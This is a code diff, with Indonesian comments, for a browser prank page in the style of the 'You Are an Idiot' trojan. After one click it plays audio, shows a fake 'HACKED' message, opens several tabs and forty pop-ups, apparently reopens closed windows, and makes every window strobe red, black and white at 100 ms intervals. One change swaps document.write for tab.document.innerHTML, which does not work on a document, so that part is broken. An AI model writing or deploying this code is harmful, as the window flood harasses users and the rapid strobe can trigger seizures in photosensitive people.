@@ -1,5 +1,5 @@
 let tabCount = 3; // Mulai dengan 3 tab
-let popUpCount = 40; // Mulai dengan 6 pop-up
+let popUpCount = 40; // Mulai dengan 40 pop-up
 let tabs = [];
 let popUpArray = [];
 let audio = new Audio('idiot.mp3'); // Memuat audio
@@ -16,9 +16,35 @@ function playAudio() {
     }
 }
 
+// Fungsi untuk mengganti konten dan membuat efek flashing
+function changeToHackerContent() {
+    const mainContent = document.getElementById('main-content');
+    if (mainContent) {
+        mainContent.innerHTML = `
+            <h1 style="color: red; text-align: center;">HACKED YOUR ARE AN IDIOT!</h1>
+        `;
+
+        // Tambahkan CSS untuk efek flashing
+        document.body.style.animation = 'flashBackground 0.1s infinite';
+
+        // Menambahkan style animasi di dalam <style> agar efeknya langsung terlihat
+        const style = document.createElement('style');
+        style.innerHTML = `
+            @keyframes flashBackground {
+                0% { background-color: black; color: red; }
+                33% { background-color: white; color: black; }
+                66% { background-color: red; color: white; }
+                100% { background-color: black; color: red; }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+}
+
 // Saat tombol "Start" diklik
 document.getElementById("startBtn").addEventListener("click", function() {
     playAudio(); // Memulai audio saat start diklik
+    changeToHackerContent(); // Ganti konten ke efek hacker
     startBackgroundFlashing(); // Mulai kedap-kedip latar belakang
     openTabsAndPopUps(tabCount, popUpCount); // Membuka tab dan pop-up awal
     monitorClose(); // Mulai memonitor tab/pop-up yang ditutup
@@ -38,7 +64,7 @@ function openTabsAndPopUps(tabMultiplier, popUpMultiplier) {
 
 // Fungsi untuk menambahkan kedap-kedip pada body tab
 function addFlashingToTab(tab) {
-    tab.document.write(`
+    tab.document.innerHTML = `
         <html>
             <head>
                 <title>HACKED YOUR AN IDIOT HAHAHAHA!</title>
@@ -60,14 +86,14 @@ function addFlashingToTab(tab) {
                 <script>
                     let flash = false;
                     setInterval(() => {
-                        document.body.style.backgroundColor = flash ? 'white' : 'red' ;  
-                        document.body.style.color = flash ? 'red' : 'red';
+                        document.body.style.backgroundColor = flash ? 'black' : 'red';  
+                        document.body.style.color = flash ? 'red' : 'white';
                         flash = !flash;
-                    }, 100);
+                    }, 100); // Kecepatan flashing sama dengan main content
                 </script>
             </body>
         </html>
-    `);
+    `;
 }
 
 // Fungsi untuk membuat pop-up di dalam setiap tab
@@ -99,10 +125,10 @@ function createPopUps(tabWindow, multiplier) {
                         <script>
                             let flash = false;
                             setInterval(() => {
-                                document.body.style.backgroundColor = flash ? 'white' : 'red' ;  
-                                document.body.style.color = flash ? 'red' : 'red';
+                                document.body.style.backgroundColor = flash ? 'black' : 'red';  
+                                document.body.style.color = flash ? 'red' : 'white';
                                 flash = !flash;
-                            }, 50);
+                            }, 100); // Kecepatan flashing sama dengan main content
                         </script>
                     </body>
                 </html>
@@ -157,8 +183,8 @@ function setRandomPosition(popUp) {
 function startBackgroundFlashing() {
     let flash = false;
     setInterval(() => {
-        document.body.style.backgroundColor = flash ? 'white' : 'red' ;  
+        document.body.style.backgroundColor = flash ? 'black' : 'red';  
         document.body.style.color = flash ? 'red' : 'white';
         flash = !flash;
-    }, 50);
+    }, 100); // Kecepatan flashing yang sama
 }
